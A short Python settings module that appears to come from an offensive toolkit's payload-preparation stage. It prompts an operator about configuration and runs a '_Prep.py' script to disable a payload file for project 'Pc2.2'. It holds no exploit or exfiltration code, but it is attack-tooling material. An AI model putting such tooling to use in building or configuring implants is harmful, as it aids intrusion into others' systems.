
# package pc2_2.payload.settings
import dsz

#-----------------------------------------------------------------------------------------
def CheckConfigLocal():
	if (dsz.ui.Prompt("Do you want to configure with FC?", True)):
		return False
	else:
		return True

#----------------------------------------------------------------------------
def Finalize(payloadFile):
	return dsz.cmd.Run("python Payload/_Prep.py -project Pc2.2 -args \"-action disable -file \\\"%s\\\"\"" % payloadFile)
